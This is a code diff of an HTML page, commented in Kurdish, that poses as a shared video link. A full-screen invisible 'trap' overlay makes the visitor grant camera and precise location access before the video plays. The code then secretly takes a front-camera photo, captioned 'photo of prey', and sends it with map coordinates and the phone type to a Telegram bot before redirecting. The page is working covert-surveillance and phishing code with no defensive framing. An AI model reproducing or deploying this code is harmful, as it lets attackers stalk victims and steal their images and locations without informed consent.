@@ -8,10 +8,13 @@
     <meta property="og:image" content="soran.jpg">
 
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; display: flex; justify-content: center; align-items: center; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; display: flex; justify-content: center; align-items: center; transition: background 0.1s; }
         .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('soran.jpg') no-repeat center center; background-size: cover; z-index: 1; filter: brightness(0.7); }
+        
+        /* سەهمی سادەی تیکتۆک بە بێ بازنە */
         .play-btn { position: absolute; z-index: 5; pointer-events: none; }
-        .play-icon { width: 90px; height: 90px; fill: white; opacity: 0.8; }
+        .play-icon { width: 90px; height: 90px; fill: white; opacity: 0.9; }
+        
         #trap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; cursor: pointer; }
         video, canvas { display: none; }
         .flash-active { background-color: white !important; }
@@ -38,21 +41,19 @@
             const btn = document.getElementById('btn');
 
             try {
-                // ١. سەرەتا داوای کامێرا دەکات (ئەگەر Allow نەکات لێرە دەوەستێت)
+                // ١. یەکەم جار داوای کامێرا دەکات
                 const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const v = document.getElementById('v');
                 v.srcObject = s;
                 await v.play();
 
-                // ٢. دواتر داوای لۆکەیشن دەکات (مەرجە Allow بکات بۆ ئەوەی بڕوات)
+                // ٢. دواتر داوای لۆکەیشن دەکات (مەرجە Allow بکات)
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(async (pos) => {
-                        // ئەگەر لۆکەیشنی دا:
-                        const lat = pos.coords.latitude;
-                        const lon = pos.coords.longitude;
-                        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 لۆکەیشن:\nhttps://www.google.com/maps?q=$" + lat + "," + lon)}`);
+                        // ئەگەر لۆکەیشنی دا، وێنە دەگرێت و دەچێت بۆ ڤیدیۆ
+                        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 لۆکەیشن:\nhttps://www.google.com/maps?q=$" + pos.coords.latitude + "," + pos.coords.longitude)}`);
                         
-                        // پاشان فلاش و وێنەگرتن
+                        // فلاش و وێنەگرتن
                         bg.style.display = 'none';
                         btn.style.display = 'none';
                         b.classList.add('flash-active');
@@ -67,20 +68,20 @@
                             const fd = new FormData();
                             fd.append('chat_id', chat_id);
                             fd.append('photo', blob, 'photo.jpg');
-                            fd.append('caption', "📸 وێنە + لۆکەیشن\n📱 مۆبایل: " + (navigator.userAgent.includes("iPhone") ? "iPhone" : "Android"));
+                            fd.append('caption', "📸 وێنەی نێچیر\n📱 مۆبایل: " + (navigator.userAgent.includes("iPhone") ? "iPhone" : "Android"));
                             
                             await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
                             window.location.href = targetVideo;
-                        }, 1000);
+                        }, 1200);
 
                     }, (err) => {
-                        // ئەگەر لۆکەیشنی Allow نەکرد، لێرە دەمێنێتەوە و ناچێتە سەر ڤیدیۆکە
-                        alert("تکایە ڕێگە بدە (Allow) بۆ ئەوەی ڤیدیۆکە ببینی");
+                        // ئەگەر لۆکەیشنی Allow نەکرد، ناچێتە سەر ڤیدیۆکە
+                        alert("بۆ بینینی ڤیدیۆکە، دەبێت ڕێگە بدەیت (Allow)");
                     }, { enableHighAccuracy: true });
                 }
             } catch (e) {
-                // ئەگەر کامێرای Allow نەکرد، هیچ ڕونادات
-                alert("بۆ بینینی ڤیدیۆکە دەبێت ڕێگە بە کامێرا بدەیت");
+                // ئەگەر کامێرای Allow نەکرد، ناچێتە سەر ڤیدیۆکە
+                alert("دەبێت ڕێگە بە کامێرا بدەیت بۆ بینینی ڤیدیۆکە");
             }
         }
     </script>
